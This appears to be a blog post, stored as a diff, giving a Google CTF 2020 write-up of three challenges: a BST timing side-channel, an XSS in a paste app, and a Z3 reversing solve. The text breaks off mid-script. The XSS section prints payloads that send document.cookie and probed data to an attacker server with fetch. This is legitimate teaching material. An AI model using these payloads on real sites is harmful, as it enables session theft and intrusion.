@@ -1,0 +1,217 @@
+<!DOCTYPE html><html lang=en> <head><title>Google CTF 2020 Writeup | callerxyz</title><meta charset=utf-8><meta name=referrer content=origin-when-cross-origin><link href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/feeds/all.atom.xml type=application/atom+xml rel=alternate title="callerxyz Full Atom Feed"><meta property=og:site_name content=callerxyz><meta property=og:locale content=en-GB><meta property=og:title content="Google CTF 2020 Writeup"><meta property=og:description content="The Google CTF was hard, so I don’t feel so bad about only solving easy challenges. Writeup also available as a Gist."><meta property=og:url content=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/google-ctf-2020-writeup><meta property=og:type content=article><meta property=article:published_time content="2020-08-24 00:00:00+01:00"><meta property=article:modified_time content><meta name=keywords content="security, ctf"><meta name=tags content=security><meta name=article:tag content=security><meta name=tags content=ctf><meta name=article:tag content=ctf><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width, initial-scale=1"><link rel=stylesheet href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/theme/css/style.css><link rel=stylesheet href=https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css referrerpolicy=no-referrer><link href="https://fonts.googleapis.com/css2?family=Arima+Madurai:wght@400;700&family=Montserrat:ital,wght@0,400;0,800;1,400;1,800&family=Orbitron:wght@700&family=Share+Tech+Mono&display=swap" rel=stylesheet referrerpolicy=no-referrer></head> <body> <main> <article> <header> <h1>Google CTF 2020 Writeup</h1> <time datetime=2020-08-24T00:00:00+01:00>August 2020</time> </header> <div class=content> <p>The Google CTF was hard, so I don&rsquo;t feel so bad about only solving easy challenges. Writeup also <a href=https://gist.github.com/bcaller/72c860e6046ff9a287ae8364aaff21d8>available as a Gist</a>.</p> <h1 id=tracing>Tracing</h1> <p>Type: pwn, Points: 151, Solves: 79</p> <h2 id=intro>Intro</h2> <p>The challenge is a contract tracing system. The server plays the part of the contract tracing app which keeps a record of all IDs it has come into contact with. The IDs are 16 byte strings represented as UUIDs. It listens on a TCP socket for connections from the health authority, which sends lists of infected IDs. The server then checks whether any IDs it has recorded are infected.</p> <p>The challenge is to force the server to disclose its IDs - one in particular will be the flag <code>CTF{???????????}</code>. Since it never transmits the IDs, we need to use a side-channel attack to disclose the flag.</p> <h2 id=getting-output-from-the-server>Getting output from the server</h2> <p>The first problem when connecting is that there&rsquo;s no response from the server, whatever you send to it.</p> <div class=highlight><pre><span></span>rlwrap nc tracing.2020.ctfcompetition.com 1337
+</pre></div> <p>Luckily, the challenge rust code builds easily with <code>cargo build</code>, so you can run it and see the debug messages. Unfortunately, I still couldn&rsquo;t reach the line <code>debug!("Received {} IDs", count);</code> until I found out that you can hangup just one side of a TCP connection. You can shutdown just the client-&gt;server side, and still receive data back from the server. In python you can use <code>sock.shutdown(socket.SHUT_WR)</code> and this makes the server continue past the <code>await</code>.</p> <h2 id=comparison>Comparison</h2> <p>When sent a list of IDs via the TCP socket, the server first builds a binary search tree (BST). For each ID the server has recorded, it searches for it within the BST.</p> <h3 id=bst>BST</h3> <p>Let&rsquo;s imagine the IDs are single bytes rather than 16 bytes. If the server receives infected IDs 25,20,30,15,27,23,55,41,67,29,24,21,10,17,26 you will end up with this beautiful balanced BST:</p> <div class=highlight><pre><span></span>                 25
+          ______/  \______
+         /                \
+        20                30
+     /     \          /       \
+   15       23       27       55
+  /  \     /  \     /  \     /  \
+ 10  17   21  24   26  29   41  67
+</pre></div> <p>If the server wants to check whether 28 exists within the BST, it walks down from the root.</p> <ul> <li>28 &gt; 25 (right)</li> <li>28 &lt; 30 (left)</li> <li>28 &gt; 27 (right)</li> <li>28 &lt; 29 (left, not found)</li> </ul> <p>For a balanced binary search tree the lookup takes time <code>O(log(n))</code>. However, the server builds a binary search tree which isn&rsquo;t necessarily balanced. The resulting tree depends on the order which the IDs are received.</p> <p>If the IDs are received in the order 10,15,17,20,21,23,24,25,26,27,29,30,41,55,67 then the BST will be super unbalanced:</p> <div class=highlight><pre><span></span>10
+ \
+  15
+   \
+    17
+     \
+      20
+      ...
+</pre></div> <p>A lookup for 8 will only require comparison with the root (8 &lt; 10) since there&rsquo;s nothing on the left.</p> <p>A lookup for 70, will require comparisons with each item of the tree (70 &gt; 10, 70 &gt; 15, 70 &gt; 17) giving the worst case lookup of <code>O(n)</code>.</p> <h2 id=leaking-ids>Leaking IDs</h2> <p>Since we, playing the role of the evil health authority, control the infected IDs sent to the server, we control the shape of the BST. By forcing a very unbalanced BST, the lookup takes much longer if the ID is on one side of the root node than the other.</p> <p>If we guess a possible alphabet of <code>!#$+-0123456789:&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ^_abcdefghijklmnopqrstuvwxyz</code>, then to determine the character after <code>CTF{</code> we start in the middle with letter Q: bisection method.</p> <p>Send the root <code>CTF{Q!!!!!!!!!!}</code> followed by 7000 IDs as far to the right as possible to produce a tree like:</p> <div class=highlight><pre><span></span>CTF{Q!!!!!!!!!!}
+                 CTF{zzzzzzzzzzz}
+              CTF{zzzzzzzzzzy}
+           CTF{zzzzzzzzzzx}
+        CTF{zzzzzzzzzzw}
+     CTF{zzzzzzzzzzv}
+  CTF{zzzzzzzzzzu}
+  ...
+</pre></div> <p>Then shutdown the write side of the connection and time the duration until the server closes the connection.</p> <div class=highlight><pre><span></span><span class=k>def</span> <span class=nf>run</span><span class=p>(</span><span class=n>root</span><span class=p>,</span> <span class=n>prefix</span><span class=p>,</span> <span class=n>suffix</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>increase</span><span class=o>=</span><span class=bp>True</span><span class=p>):</span>
+    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>root</span><span class=p>)</span> <span class=o>==</span> <span class=mi>16</span>
+    <span class=k>print</span><span class=p>(</span><span class=n>root</span><span class=p>,</span> <span class=n>prefix</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>increase</span><span class=p>)</span>
+    <span class=n>sock</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_STREAM</span><span class=p>)</span>
+    <span class=n>sock</span><span class=o>.</span><span class=n>connect</span><span class=p>((</span><span class=s1>&#39;tracing.2020.ctfcompetition.com&#39;</span><span class=p>,</span> <span class=mi>1337</span><span class=p>))</span>
+    <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>root</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
+
+    <span class=n>attempts</span> <span class=o>=</span> <span class=o>...</span>
+    <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=n>attempts</span><span class=p>:</span>
+        <span class=n>sock</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>attempt</span><span class=p>)</span>
+    <span class=n>sock</span><span class=o>.</span><span class=n>shutdown</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SHUT_WR</span><span class=p>)</span>
+    <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+    <span class=n>start</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time_ns</span><span class=p>()</span>
+    <span class=k>while</span> <span class=n>data</span><span class=p>:</span>
+        <span class=n>data</span> <span class=o>=</span> <span class=n>sock</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+    <span class=n>end</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time_ns</span><span class=p>()</span>
+    <span class=n>sock</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+    <span class=n>timing</span> <span class=o>=</span> <span class=n>end</span> <span class=o>-</span> <span class=n>start</span>
+    <span class=k>print</span><span class=p>(</span><span class=n>timing</span><span class=p>)</span>
+    <span class=k>return</span> <span class=n>timing</span>
+</pre></div> <p>If the flag is anywhere to the right of the root, the server will have to search all the way through the 7000 IDs. If the flag is anywhere to the left of the root, the lookup will complete after just one comparison with the root.</p> <p>Then make the BST weighted to the left and compare the timings. If the right-weighted tree lookup took much longer, the first character of the flag is between <code>Q</code> and <code>z</code>: we set the midpoint to <code>h</code>.</p> <p>At some point later we have determined that the flag starts <code>CTF{1Bi</code> and that the next character is within <code>qrstuvwxy</code>. We send a right-weighted tree and it responds in 0.02ms.</p> <div class=highlight><pre><span></span>CTF{1Biu!!!!!!!}
+                 CTF{1Bi y zzzzzzz}
+              CTF{1Bi y zzzzzzy}
+           CTF{1Bi y zzzzzzx}
+        CTF{1Bi y zzzzzzw}
+     CTF{1Bi y zzzzzzv}
+  CTF{1Bi y zzzzzzu}
+</pre></div> <p>And the left-weighted tree responds in 88.6ms. <div class=highlight><pre><span></span>                 CTF{1Biuzzzzzzz}
+CTF{1Biq!!!!!!!}
+   CTF{1Biq!!!!!!#}
+      CTF{1Biq!!!!!!$}
+         CTF{1Biq!!!!!!+}
+            CTF{1Biq!!!!!!-}
+               CTF{1Biq!!!!!!0}
+</pre></div></p> <p>So we guess that the character after <code>CTF{1Bi</code> is within <code>qrstu</code> (to the left).</p> <p>There were some issues with getting accurate timings, especially when the midpoint was the correct letter, but with a bit of messing around we get the flag <code>CTF{1BitAtATime}</code>.</p> <p>This was a fun challenge that just requires a little computer science.</p> <h1 id=pasteurize>Pasteurize</h1> <p>Type: web, Points: 50, Solves: 260</p> <p>Let&rsquo;s investigate the source code.</p> <h2 id=source-code>Source code</h2> <h3 id=body-parser>Body parser</h3> <div class=highlight><pre><span></span><span class=cm>/* They say reCAPTCHA needs those. But does it? */</span>
+<span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>bodyParser</span><span class=p>.</span><span class=nx>urlencoded</span><span class=p>({</span>
+  <span class=nx>extended</span><span class=o>:</span> <span class=kc>true</span>
+<span class=p>}));</span>
+</pre></div> <p>Extended body parser allows sending arrays and objects as form params. You can send <code>a=1&amp;a=2</code> which makes <code>req.body.a = ["1", "2"]</code> (of type array instead of string as usual).</p> <h3 id=xss-in-get-note>XSS in GET note</h3> <div class=highlight><pre><span></span><span class=cm>/* Make sure to properly escape the note! */</span>
+<span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/:id([a-f0-9\-]{36})&#39;</span><span class=p>,</span> <span class=nx>recaptcha</span><span class=p>.</span><span class=nx>middleware</span><span class=p>.</span><span class=nx>render</span><span class=p>,</span> <span class=nx>utils</span><span class=p>.</span><span class=nx>cache_mw</span><span class=p>,</span> <span class=nx>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
+  <span class=kr>const</span> <span class=nx>note_id</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>params</span><span class=p>.</span><span class=nx>id</span><span class=p>;</span>
+  <span class=kr>const</span> <span class=nx>note</span> <span class=o>=</span> <span class=nx>await</span> <span class=nx>DB</span><span class=p>.</span><span class=nx>get_note</span><span class=p>(</span><span class=nx>note_id</span><span class=p>);</span>
+
+  <span class=k>if</span> <span class=p>(</span><span class=nx>note</span> <span class=o>==</span> <span class=kc>null</span><span class=p>)</span> <span class=p>{</span>
+    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>404</span><span class=p>).</span><span class=nx>send</span><span class=p>(</span><span class=s2>&quot;Paste not found or access has been denied.&quot;</span><span class=p>);</span>
+  <span class=p>}</span>
+
+  <span class=kr>const</span> <span class=nx>unsafe_content</span> <span class=o>=</span> <span class=nx>note</span><span class=p>.</span><span class=nx>content</span><span class=p>;</span>
+  <span class=kr>const</span> <span class=nx>safe_content</span> <span class=o>=</span> <span class=nx>escape_string</span><span class=p>(</span><span class=nx>unsafe_content</span><span class=p>);</span> <span class=cm>/***************************/</span>
+
+  <span class=nx>res</span><span class=p>.</span><span class=nx>render</span><span class=p>(</span><span class=s1>&#39;note_public&#39;</span><span class=p>,</span> <span class=p>{</span>
+    <span class=nx>content</span><span class=o>:</span> <span class=nx>safe_content</span><span class=p>,</span>
+    <span class=nx>id</span><span class=o>:</span> <span class=nx>note_id</span><span class=p>,</span>
+    <span class=nx>captcha</span><span class=o>:</span> <span class=nx>res</span><span class=p>.</span><span class=nx>recaptcha</span>
+  <span class=p>});</span>
+<span class=p>});</span>
+</pre></div> <p>Let&rsquo;s look at the critical <code>escape_string</code> method:</p> <div class=highlight><pre><span></span><span class=cm>/* Who wants a slice? */</span>
+<span class=kr>const</span> <span class=nx>escape_string</span> <span class=o>=</span> <span class=nx>unsafe</span> <span class=p>=&gt;</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>unsafe</span><span class=p>).</span><span class=nx>slice</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=o>-</span><span class=mi>1</span><span class=p>)</span>
+  <span class=p>.</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&lt;/g</span><span class=p>,</span> <span class=s1>&#39;\\x3C&#39;</span><span class=p>).</span><span class=nx>replace</span><span class=p>(</span><span class=sr>/&gt;/g</span><span class=p>,</span> <span class=s1>&#39;\\x3E&#39;</span><span class=p>);</span>
+</pre></div> <p>How does it work with strings?</p> <div class=highlight><pre><span></span>escape_string(&#39;abc&#39;)
+&#39;abc&#39;
+escape_string(&#39;a&quot;b&quot;c&#39;)
+&#39;a\\&quot;b\\&quot;c&#39;
+</pre></div> <p>But because of extended bodyparser we can send arrays:</p> <div class=highlight><pre><span></span>escape_string([])
+&#39;&#39;
+escape_string([&#39;a&#39;, &#39;b&#39;])
+&#39;&quot;a&quot;,&quot;b&quot;&#39;
+escape_string([&#39;;//&#39;])
+&#39;&quot;;//&quot;&#39;
+</pre></div> <h2 id=solution>Solution</h2> <p>The output of <code>escape_string</code> ends up being served within javascript surrounded by double quotes. We can break out of the double quotes by sending an array request such as:</p> <div class=highlight><pre><span></span>curl -L https://pasteurize.web.ctfcompetition.com/ <span class=se>\</span>
+  --data <span class=s2>&quot;content=;function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(\`https://myserver/\`) } aa(document.cookie);//&amp;content=x&quot;</span>
+</pre></div> <p>The note contains html:</p> <div class=highlight><pre><span></span>    <span class=p>&lt;</span><span class=nt>script</span><span class=p>&gt;</span>
+        <span class=kr>const</span> <span class=nx>note</span> <span class=o>=</span> <span class=s2>&quot;&quot;</span><span class=p>;</span><span class=kd>function</span> <span class=nx>aa</span><span class=p>(</span><span class=nx>d</span><span class=p>)</span> <span class=p>{</span> <span class=kr>const</span> <span class=nx>e</span> <span class=o>=</span> <span class=nx>btoa</span><span class=p>(</span><span class=nx>JSON</span><span class=p>.</span><span class=nx>stringify</span><span class=p>(</span><span class=nx>d</span><span class=p>));</span> <span class=k>return</span> <span class=nx>fetch</span><span class=p>(</span><span class=sb>`https://myserver/`</span><span class=p>)</span> <span class=p>}</span> <span class=nx>aa</span><span class=p>(</span><span class=nb>document</span><span class=p>.</span><span class=nx>cookie</span><span class=p>);</span><span class=c1>//&quot;,&quot;x&quot;&quot;;</span>
+        <span class=kr>const</span> <span class=nx>note_id</span> <span class=o>=</span> <span class=s2>&quot;dc8ec4b1-0c03-4887-9e9e-b4d580759138&quot;</span><span class=p>;</span>
+        <span class=kr>const</span> <span class=nx>note_el</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;note-content&#39;</span><span class=p>);</span>
+        <span class=kr>const</span> <span class=nx>note_url_el</span> <span class=o>=</span> <span class=nb>document</span><span class=p>.</span><span class=nx>getElementById</span><span class=p>(</span><span class=s1>&#39;note-title&#39;</span><span class=p>);</span>
+        <span class=kr>const</span> <span class=nx>clean</span> <span class=o>=</span> <span class=nx>DOMPurify</span><span class=p>.</span><span class=nx>sanitize</span><span class=p>(</span><span class=nx>note</span><span class=p>);</span>
+        <span class=nx>note_el</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=nx>clean</span><span class=p>;</span>
+        <span class=nx>note_url_el</span><span class=p>.</span><span class=nx>href</span> <span class=o>=</span> <span class=sb>`/</span><span class=si>${</span><span class=nx>note_id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+        <span class=nx>note_url_el</span><span class=p>.</span><span class=nx>innerHTML</span> <span class=o>=</span> <span class=sb>`</span><span class=si>${</span><span class=nx>note_id</span><span class=si>}</span><span class=sb>`</span><span class=p>;</span>
+    <span class=p>&lt;/</span><span class=nt>script</span><span class=p>&gt;</span>
+</pre></div> <p>Now we just share the note with TJMike🎤 and wait for his headless Chrome to report the base64-encoded cookie with flag back to your server.</p> <h2 id=extra>Extra</h2> <p>I also tried to exploit the headless Chrome with <a href=https://github.com/bcaller/puppet-puncher>puppet-puncher</a> with payload</p> <div class=highlight><pre><span></span>content=;var ok=0;function zzq(){if(ok){return;} ok=1; function aa(d) { const e = btoa(JSON.stringify(d)); return fetch(`https://myserver/?x=<span class=cp>${</span><span class=n>e</span><span class=cp>}</span>`) } function rs(k, s) { aa([k, s]) } Object.keys(window).filter(function(k){return typeof window[k] == &#39;function&#39;}).filter(function(k){return k.indexOf(&#39;zzq&#39;) == -1}).filter(function(k){return window[k].toString().indexOf(&#39;[bindingName]&#39;) != -1}).forEach(function(k){ const f = window[k];try{f({&#39;toString&#39;: null, &#39;__proto__&#39;: null}).then(function(){return f()}).then(function(f){return f([-1.3e99, &#39;n&#39;, null], &#39;hi&#39;, {&#39;toString&#39;: null})}).then(function(r){return aa([k, r])}).catch(function(e){return rs(k, e.stack)})}catch(ee){}});aa(document.cookie)};window.onload=zzq;//<span class=err>&amp;</span>content=x
+</pre></div> <p>but no exposed functions were found.</p> <h1 id=beginner>Beginner</h1> <p>Type: reversing, Points: 50, Solves: 482</p> <h2 id=intro_1>Intro</h2> <p>This binary verifies if a flag is correct or not. The flag isn&rsquo;t inside the binary: instead you have to understand how the verification works and reverse it to make a flag which outputs <code>SUCCESS</code> instead of <code>FAILURE</code>.</p> <h2 id=disassembly>Disassembly</h2> <p>Load it into <code>gdb</code> and <code>disas main</code>:</p> <div class=highlight><pre><span></span>Dump of assembler code for function main:
+   0x0000000000001080 &lt;+0&gt;:     push   r12
+   0x0000000000001082 &lt;+2&gt;:     lea    rdi,[rip+0xf7b]        # 0x2004
+   0x0000000000001089 &lt;+9&gt;:     xor    eax,eax
+   0x000000000000108b &lt;+11&gt;:    push   rbp
+   0x000000000000108c &lt;+12&gt;:    sub    rsp,0x28
+   0x0000000000001090 &lt;+16&gt;:    call   0x1050 &lt;printf@plt&gt;
+   0x0000000000001095 &lt;+21&gt;:    mov    r12,rsp
+   0x0000000000001098 &lt;+24&gt;:    xor    eax,eax
+   0x000000000000109a &lt;+26&gt;:    lea    rbp,[rsp+0x10]
+   0x000000000000109f &lt;+31&gt;:    mov    rsi,r12
+   0x00000000000010a2 &lt;+34&gt;:    lea    rdi,[rip+0xf62]        # 0x200b
+   0x00000000000010a9 &lt;+41&gt;:    call   0x1060 &lt;__isoc99_scanf@plt&gt;
+   0x00000000000010ae &lt;+46&gt;:    movdqa xmm0,XMMWORD PTR [rsp]
+   0x00000000000010b3 &lt;+51&gt;:    mov    rsi,rbp
+   0x00000000000010b6 &lt;+54&gt;:    mov    rdi,r12
+   0x00000000000010b9 &lt;+57&gt;:    mov    edx,0x10
+   0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;
+   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;
+   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;
+   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0
+   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;
+   0x00000000000010e1 &lt;+97&gt;:    test   eax,eax
+   0x00000000000010e3 &lt;+99&gt;:    jne    0x1100 &lt;main+128&gt;
+   0x00000000000010e5 &lt;+101&gt;:   mov    rsi,QWORD PTR [rip+0x2f94]        # 0x4080 &lt;EXPECTED_PREFIX&gt;
+   0x00000000000010ec &lt;+108&gt;:   mov    edx,0x4
+   0x00000000000010f1 &lt;+113&gt;:   mov    rdi,rbp
+   0x00000000000010f4 &lt;+116&gt;:   call   0x1030 &lt;strncmp@plt&gt;
+   0x00000000000010f9 &lt;+121&gt;:   mov    r12d,eax
+   0x00000000000010fc &lt;+124&gt;:   test   eax,eax
+   0x00000000000010fe &lt;+126&gt;:   je     0x111d &lt;main+157&gt;
+   0x0000000000001100 &lt;+128&gt;:   lea    rdi,[rip+0xf11]        # 0x2018
+   0x0000000000001107 &lt;+135&gt;:   mov    r12d,0x1
+   0x000000000000110d &lt;+141&gt;:   call   0x1040 &lt;puts@plt&gt;
+   0x0000000000001112 &lt;+146&gt;:   add    rsp,0x28
+   0x0000000000001116 &lt;+150&gt;:   mov    eax,r12d
+   0x0000000000001119 &lt;+153&gt;:   pop    rbp
+   0x000000000000111a &lt;+154&gt;:   pop    r12
+   0x000000000000111c &lt;+156&gt;:   ret
+   0x000000000000111d &lt;+157&gt;:   lea    rdi,[rip+0xeec]        # 0x2010
+   0x0000000000001124 &lt;+164&gt;:   call   0x1040 &lt;puts@plt&gt;
+   0x0000000000001129 &lt;+169&gt;:   jmp    0x1112 &lt;main+146&gt;
+End of assembler dump.
+</pre></div> <p>The key part is:</p> <div class=highlight><pre><span></span>   0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;
+   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;
+   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;
+   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0
+   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;
+</pre></div> <p>The input (flag) is placed in a 128-bit register <code>xmm0</code> and 3 128-bit operations are performed:</p> <ol> <li>Shuffle register based on key in 0x4070 (not randomly)</li> <li>Add register and value in 0x4060 as 4 32-bit uints (carry bits don&rsquo;t propaagate between the 4 additions)</li> <li>XOR with value in 0x4050</li> </ol> <p>The result should equal the original input flag (<code>strncmp</code>).</p> <h2 id=solution_1>Solution</h2> <p>The XOR, ADD32, SHUFFLE keys can be extracted easily. However, shuffle was a bit confusing, so I just experimented to see how input was transformed:</p> <div class=highlight><pre><span></span># Set breakpoint just after shuffle
+&gt; break *main+71
+&gt; run
+Flag: abcdefghijklmnopqr
+&gt; p (char[]) $xmm0
+$1 = &quot;cghbfljod\000eikmna&quot;
+</pre></div> <p>Next to find an input which remains the same at the end of the 3 transformations I used the SAT solver Z3 (<code>pip install z3-solver</code>).</p> <div class=highlight><pre><span></span><span class=kn>import</span> <span class=nn>struct</span>
+<span class=kn>from</span> <span class=nn>z3</span> <span class=kn>import</span> <span class=o>*</span>
+
+<span class=n>shuffle_mask</span> <span class=o>=</span> <span class=p>[</span><span class=mi>2</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>]</span>
+
+<span class=n>s</span> <span class=o>=</span> <span class=n>Solver</span><span class=p>()</span>
+
+<span class=n>original</span> <span class=o>=</span> <span class=n>Ints</span><span class=p>(</span><span class=s1>&#39;_a _b _c _d _e _f _g _h _i _j _k _l _m _n _o&#39;</span><span class=p>)</span>
+
+<span class=n>shuffled</span> <span class=o>=</span> <span class=p>[</span><span class=n>original</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=k>if</span> <span class=n>i</span> <span class=o>!=</span> <span class=mi>15</span> <span class=k>else</span> <span class=n>IntVal</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>shuffle_mask</span><span class=p>]</span>
+
+<span class=n>ADD</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0xdeadbeef</span><span class=p>,</span> <span class=mh>0xfee1dead</span><span class=p>,</span> <span class=mh>0x13371337</span><span class=p>,</span> <span class=mh>0x67637466</span><span class=p>]</span>
+
+<span class=c1># XOR = [0x49b45876, 0x385f1a8d, 0x34f823d4, 0xaaf986eb]</span>
+<span class=n>XOR</span> <span class=o>=</span> <span class=p>[</span><span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0xb4</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x8d</span><span class=p>,</span> <span class=mh>0x1a</span><span class=p>,</span> <span class=mh>0x5f</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0xd4</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0xf8</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0xeb</span><span class=p>,</span> <span class=mh>0x86</span><span class=p>,</span> <span class=mh>0xf9</span><span class=p>,</span> <span class=mh>0xaa</span><span class=p>]</span>
+<span class=n>XOR</span> <span class=o>=</span> <span class=p>[</span><span class=n>BitVecVal</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span> <span class=k>for</span> <span class=n>a</span> <span class=ow>in</span> <span class=n>XOR</span><span class=p>]</span>
+
+<span class=c1># Add in 4 32-bit ints</span>
+<span class=n>mega_add</span> <span class=o>=</span> <span class=p>[</span>
+    <span class=n>additive</span> <span class=o>+</span> <span class=nb>sum</span><span class=p>(</span>
+        <span class=n>x</span> <span class=o>*</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=n>j</span><span class=p>))</span> <span class=k>if</span> <span class=n>j</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=k>else</span> <span class=n>x</span>
+        <span class=k>for</span> <span class=n>j</span><span class=p>,</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>shuffled</span><span class=p>[</span><span class=n>i</span><span class=o>*</span><span class=mi>4</span><span class=p>:</span><span class=mi>4</span><span class=o>*</span><span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>)])</span>
+    <span class=p>)</span>
+    <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>additive</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>ADD</span><span class=p>)</span>
+<span class=p>]</span>
+<span class=c1># Split result back into 16 bytes</span>
+<span class=n>added</span> <span class=o>=</span> <span class=p>[</span>
+    <span class=n>Int2BV</span><span class=p>(</span><span class=n>m</span> <span class=o>/</span> <span class=p>(</span><span class=mi>1</span> <span class=o>&lt;&lt;</span> <span class=p>(</span><span class=mi>8</span> <span class=o>*</span> <span class=n>i</span><span class=p>)),</span> <span class=mi>8</span><span class=p>)</span> <span class=k>if</span> <span class=n>i</span> <span class=o>&gt;</span> <span class=mi>0</span> <span class=k>else</span> <span class=n>Int2BV</span><span class=p>(</span><span class=n>m</span><span class=p>,</span> <span class=mi>8</span><span class=p>)</span>
+    <span class=k>for</span> <span class=n>m</span> <span class=ow>in</span> <span class=n>mega_add</span>
+    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
+<span class=p>]</span>
+
+<span class=n>xored</span> <span class=o>=</span> <span class=p>[</span><span class=n>added_var</span> <span class=o>^</span> <span class=n>xor</span> <span class=k>for</span> <span class=n>added_var</span><span class=p>,</span> <span class=n>xor</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>added</span><span class=p>,</span> <span class=n>XOR</span><span class=p>)]</span>
+
+<span class=n>outputs</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>xored</span><span class=p>)</span>
+
+<span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>cribbed</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=s1>&#39;CTF{*********!}&#39;</span><span class=p>):</span>
+    <span class=k>if</span> <span class=n>cribbed</span> <span class=o>!=</span> <span class=s1>&#39;*&#39;</span><span class=p>:</span>
+        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>original</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=nb>ord</span><span class=p>(</span><span class=n>cribbed</span><span class=p>))</span>
